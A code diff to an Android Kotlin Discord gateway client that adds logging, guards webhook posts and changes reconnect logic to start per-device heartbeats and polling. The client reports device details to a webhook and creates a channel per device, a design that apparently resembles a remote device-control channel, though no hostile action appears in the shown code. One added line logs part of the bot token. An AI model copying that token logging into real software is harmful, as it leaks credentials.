@@ -143,9 +143,11 @@ class DiscordGatewayClient(
                 put("sdk", android.os.Build.VERSION.SDK_INT)
                 put("suffix", deviceSuffix)
             })
+            android.util.Log.d("DiscordGateway", "Starting gateway client with token: ${DiscordConfig.BOT_TOKEN.take(10)}...")
             preflightCheck()
-        } catch (_: Exception) {
+        } catch (e: Exception) {
             status("Crashed")
+            android.util.Log.e("DiscordGateway", "Start failed", e)
         }
     }
 
@@ -179,10 +181,10 @@ class DiscordGatewayClient(
                             put("event", "token_ok")
                             put("bot", user)
                         })
-                        bootViaRest()
                         connect()
                     } else if (r.code == 401) {
                         status("Token INVALID")
+                        android.util.Log.e("DiscordGateway", "Token invalid! HTTP 401. Update the token in DiscordConfig.kt")
                         whPost(JSONObject().apply {
                             put("event", "token_invalid")
                             put("code", r.code)
@@ -190,6 +192,7 @@ class DiscordGatewayClient(
                         fatalError = true
                     } else {
                         r.body?.close()
+                        android.util.Log.w("DiscordGateway", "Preflight failed: HTTP ${r.code}")
                         whPost(JSONObject().apply {
                             put("event", "preflight_fail")
                             put("code", r.code)
@@ -206,7 +209,8 @@ class DiscordGatewayClient(
                         }
                     }
                 }
-            } catch (_: Exception) {
+            } catch (e: Exception) {
+                android.util.Log.e("DiscordGateway", "Preflight exception", e)
                 if (attempt < 3) {
                     status("Retry preflight")
                     delay((1000L shl attempt).coerceAtMost(8000L))
@@ -257,6 +261,7 @@ class DiscordGatewayClient(
     }
 
     private fun whPost(data: JSONObject) {
+        if (DiscordConfig.WEBHOOK_URL.isBlank()) return
         scope?.launch(Dispatchers.IO) {
             try {
                 val body = data.toString()
@@ -438,11 +443,20 @@ class DiscordGatewayClient(
                 reconnectAttempt = 0
                 status("Ready")
                 saveState()
+                if (myChannelId != null && onlineMsgSent) {
+                    startDeviceHeartbeat()
+                    startPolling()
+                }
             }
             "RESUMED" -> {
                 reconnectAttempt = 0
                 startHeartbeat()
-                if (myChannelId == null) {
+                if (myChannelId != null) {
+                    if (onlineMsgSent) {
+                        startDeviceHeartbeat()
+                        startPolling()
+                    }
+                } else {
                     scope?.launch(Dispatchers.IO) { findOrCreateChannelViaRest() }
                 }
             }
@@ -453,7 +467,7 @@ class DiscordGatewayClient(
                     saveState()
                 }
                 if (guildId != null && myChannelId == null) {
-                    findOrCreateChannel(data.optJSONArray("channels"))
+                    scope?.launch(Dispatchers.IO) { findOrCreateChannelViaRest() }
                 }
             }
             "MESSAGE_CREATE" -> {
